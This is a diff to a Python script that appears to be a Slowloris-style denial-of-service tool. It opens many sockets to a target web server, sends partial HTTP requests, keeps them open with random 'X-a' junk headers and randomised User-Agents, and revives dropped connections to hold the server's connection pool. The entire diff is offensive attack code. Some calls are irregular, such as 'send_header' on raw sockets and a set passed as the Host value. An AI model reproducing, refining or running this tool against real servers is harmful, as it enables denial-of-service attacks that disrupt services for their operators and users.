@@ -141,9 +141,12 @@ def init_socket(args):
         port = args.port
         dst = socket.gethostbyname(args.host)
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(2)
         s.connect((dst, port))
         s.send((f"GET / HTTP/1.1\n").encode('utf-8'))
         s.send_header('Host', {dst})
+        
+        s.send_header("Connection", "keep-alive")
         if args.randagent:
             agents = load_agents('agents.txt')
             s.send_header('User-Agent', choice(agents))
@@ -169,7 +172,7 @@ def iteration(list, args):
     for i in range(len(list)-1, -1, -1):
         sock = list[i]
         try:
-            sock.send_header('Connection', 'keep-alive')
+            sock.send_header('X-a', randint(0, 5000))
         except socket.error as s:
             list.remove(sock)
             dead += 1
@@ -183,15 +186,19 @@ def iteration(list, args):
 
     alive = str(len(list))
 
-    print(f'reviving {dead} dead sockets...')
-    for i in range(0, dead):
-        try:
-            s = init_socket(args)
-            list.append(s)
-        except Exception:
-            print(f'socket initialization error...')
-            failed += 1
-            continue
+    
+    if dead != 0:
+        print(f'reviving {dead} dead sockets...')
+        for i in range(0, dead):
+            try:
+                s = init_socket(args)
+                list.append(s)
+            except Exception as s:
+                print(f'socket initialization error {s}...')
+                failed += 1
+                continue
+    else:
+        print('No dead sockets...')
     print(f'{len(list)} sockets alive...')
     print(f'end of iteration...')
     out = [str(dead), alive, str(headers), str(failed)]
